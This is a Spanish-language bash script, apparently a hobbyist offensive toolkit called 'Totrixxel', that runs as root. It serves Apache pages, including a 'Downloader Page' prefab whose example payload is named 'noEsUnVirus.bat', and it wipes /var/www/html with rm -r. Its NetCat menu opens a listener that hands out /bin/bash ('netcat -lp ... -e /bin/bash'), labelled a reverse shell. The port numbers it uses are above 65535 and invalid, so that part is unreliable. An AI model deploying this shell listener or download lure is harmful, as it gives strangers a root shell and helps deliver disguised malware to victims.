#!/bin/bash
#Variables
root_verify=$(whoami)
usuario=$(users)

#Programa
function init_program() {
    echo -e "Bienvenido a Totrixxel..."
    echo -e "Que quieres hacer?"
    echo -e "[1] Montar pagina local      [2] Descargar prefabs (git)\n[3] Iniciar pagina local     [4] NetCat"; read qaction
    if [ $qaction == "1" ]
    then
        echo -e "Tienes una pagina?[y/n] >> "; read qpagexist
        if [ $qpagexist == "y" ]
        then
            echo -e "[*] Info: Ej: /home/$usuario/Descargas/prefabs/"
            echo -e "Ruta completa de la pagina >> "; read pagdir
            rm -r /var/www/html
            mkdir /var/www/html
            cp  $pagdir* /var/www/html
        elif [ $qpagexist == "n" ]
        then
            echo -e "Selecciona un prefab"
            echo -e "[0] Txx Info    [1] Downloader Page\n"; read qprefabpag
            if [ $qprefabpag == "0" ]
            then
            	rm -r /var/www/html
            	mkdir /var/www/html
            	cp /prefabs/txx/* /var/www/html
            elif [ $qprefabpag == "1" ]
            then
                rm -r /var/www/html/
                mkdir /var/www/html/
                echo -e "[*] Info: Ej: /home/$usuario/Descargas/prepag/noEsUnVirus.bat"
                echo -e "Ruta completa de el archivo >> "; read filedir
                cp $filedir /var/www/html/
                mv /var/www/html/* /var/www/html/archivo.txt
                cp /prefabs/dwd_file/* /var/www/html/
            elif [ $qprefabpag == "3" ]
            then
                rm -r /var/www/html
                mkdir /var/www/html
                cp /prefabs/tw/* /var/www/html
            else
                echo -e "[-] Err: Opcion no existe."
            fi
        else
            echo -e "[-] Err: Opcion no existe."
        fi
        service apache2 start
        echo -e "[*] Totrixxel está ejecutando la página en vivo..."
        echo -e "Presiona 'Enter' para dejar de ejecutar el servidor..."; read
        echo -e "[*] Totrixxel está cerrando el servidor..."
        service apache2 stop
        echo -e "[*] El servidor xTx se ha cerrado correctamente."
    elif [ $qaction == "2" ]
    then
        echo -e "Creador del repo"; read repouser
        echo -e "\nNombre del repo";read reponame
        rm -r /var/www/html
        mkdir /var/www/html
        cd /var/www/html
    	git clone https://www.github.com/$repouser/$reponame
    elif [ $qaction == "3" ]
    then
        service apache2 start
        echo -e "[*] Totrixxel está ejecutando la página en vivo..."
        echo -e "Presiona 'Enter' para dejar de ejecutar el servidor..."; read
        echo -e "[*] Totrixxel está cerrando el servidor..."
        service apache2 stop
        echo -e "[*] El servidor xTx se ha cerrado correctamente."
    elif [ $qaction == "4" ]
    then
        echo -e "[1] Chat    [2] Reverse Shell"; read qncaction
        if [ $qncaction == "1" ]
        then
            echo -e "[*] Creando chat en el puerto: 70450..."
            netcat -lp 70450
        elif [ $qncaction == "2" ]
        then
            echo -e "[*] Creando Reverse Shell en el puerto 80920..."
            netcat -lp 80920 -e /bin/bash
        fi
    fi
}

#Cargar Prefabricados
function charge_prefabs() {
    cp totrixxel.sh /usr/bin/
    mv /usr/bin/totrixxel.sh /usr/bin/totrixxel
    cp -r prefabs /usr/bin/
    init_program
}

if [ $root_verify != "root" ]
then
    echo -e "[-] Es necesario ejecutar Totrixxel como super-usuario (root)"
else
    if [ -d /usr/bin/prefabs ]
    then
        init_program
    else
        charge_prefabs
    fi
fi
